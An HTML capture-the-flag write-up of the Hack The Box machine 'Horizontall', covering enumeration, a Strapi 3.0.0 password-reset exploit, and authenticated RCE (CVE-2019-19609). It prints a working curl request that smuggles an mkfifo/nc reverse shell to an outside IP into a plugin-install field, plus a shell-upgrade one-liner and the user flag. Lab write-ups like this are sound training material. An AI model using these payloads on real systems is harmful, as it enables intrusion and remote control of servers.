@@ -1,0 +1,84 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>New Page</title>
+</head><body><span style="font-size: 16pt">IP:  10.10.11.105<br/>
+HostName:  Horizontall<br/>
+<br/>
+Began with an nmap scan to enumerate any information on open ports. <br/>
+<img height="430" src="image.png" width="700"/><br/>
+Nmap Enumeration Information:<br/>
+Open Ports: 22(SSH), 80(HTTP)<br/>
+Software version / OS via port 80 (nginx/1.14.0 (Ubuntu))<br/>
+<br/>
+The secondary activity was a directory scan, this only enumerated known, non-senstive web directories such as CSS and other Java script files.<br/>
+<img src="image 3.png"/><br/>
+<br/>
+A subdomain enermation resulted in &quot;api-prod.horizontall.htb:80&quot;. Once the host was added via &quot;/etc/hosts&quot;, a successful connection to the sub domain was recieved.<br/>
+<img src="image 2.png"/><br/>
+<br/>
+</span><span style="font-size: 16pt">The subdomain </span>does not disclose sensitive information, the inital landing directory was &quot;reviews&quot;. <br/>
+<br/>
+This began another gobuster directory enumeration targeting the newly found subdomain. This immediatly resulted in multiple subdomains, one of which was an admin login portal.<br/>
+<img height="286" src="image 4.png" width="800"/><br/>
+<br/>
+Admin directory: It is now known the the content management system is &quot;strapi&quot;<br/>
+<img height="153" src="image 5.png" width="550"/><br/>
+<br/>
+The usrs directory was then check leading to a 403 error. The /auth/ directory was then checked and also recieved a 403. No luck it seemed.<br/>
+<br/>
+Moved onto checking strapi within exploitDB using searchsploit, only 3 vulerbailities were seen for version 3.0.0. One of the exploits appeared to be a set password and remote execution once authenticated. The third did not require authentication. I figured try set password first to recieve authenticationm otherwise choose the ladder.<br/>
+<img height="63" src="image 6.png" width="850"/><br/>
+<br/>
+After reading the set-password exploit it appeared strapi version can be found at &quot;/admin/strapiVersion&quot;. This confirmed the version as 3.0.0<br/>
+<img src="image 7.png"/><br/>
+<br/>
+The password vulnerability reques a user email. I do not know, so I shall try admin@horizontall.htb. Why not, go big or go home. <br/>
+There was an account registered under than name, and now we have successfully changed the password 'codiobert'<br/>
+<img src="image.png"/><img src="image.png"/><br/>
+<img src="image 8.png"/><br/>
+<br/>
+<span style="font-size: 14pt"><b>Username: admin<br/>
+Password: codiobert<br/>
+<br/>
+</b>Lets try ssh. Didn't work, back to the web portal. Which successfully logged in.<br/>
+</span><img height="359" src="image 9.png" width="700"/><br/>
+<br/>
+Immediatly I see a file Upload option, although remeber we had the authenticated RCE to try.<br/>
+CVE : CVE-2019-19609<br/>
+Use: python3 %s http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST<br/>
+<br/>
+Seems like I need a jwt token, lets try to go find one. Starting with plugins, nothing, hopping to Users, we can create a new authenticated user. Lets do that.<br/>
+<img height="242" src="image 10.png" width="750"/><br/>
+<br/>
+Inspecting the user... no jwt<br/>
+<img height="183" src="image 11.png" width="750"/><br/>
+<br/>
+Looking online we found <a href="https://docs.strapi.io/developer-docs/latest/guides/jwt-validation.html">this<br/>
+</a>Logging in should result in a post request which recieves the jwt. Boom got it.<br/>
+<img height="152" src="image 12.png" width="800"/><br/>
+JWT TOKEN:<br/>
+Back to the exploit<br/>
+Use: python3 %s http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST<br/>
+<b>Successful RCE:<br/>
+</b><img height="159" src="image 13.png" width="800"/><br/>
+<br/>
+I took way to long spwaning a shell, I found a new oiption to try via curl request.<br/>
+&gt; https://bittherapy.net/post/strapi-framework-remote-code-execution/<br/>
+&gt; curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM5MjE2MTk2LCJleHAiOjE2NDE4MDgxOTZ9.5LVXS1ygCs-Viev0R8NwdBr_8rQODuxAwYXA4h6bGPk' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\&quot;plugin\&quot;:\&quot;documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.11 4545 &gt;/tmp/f)\&quot;,\&quot;port\&quot;:\&quot;80\&quot;}' $'http://api-prod.horizontall.htb/admin/plugins/install'<br/>
+<img src="image 14.png"/><br/>
+<br/>
+Took to long but it was done.<br/>
+Previous allowed me to enumerate python version but we can do it once more now that we have shell.<br/>
+<img src="image 15.png"/><br/>
+Lets get user flag<br/>
+<img src="image 16.png"/><br/>
+<br/>
+User Flag:   1e0ebc8f358691b4b6ee8fd22f92f98b<br/>
+<br/>
+noice this worked too <br/>
+&gt; python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'<br/>
+<a href="https://forum.strapi.io/t/should-jwt-secret-be-generated-and-versioned-by-default-6238/1454"><br/>
+<br/>
+</a><br/>
+</body></html>
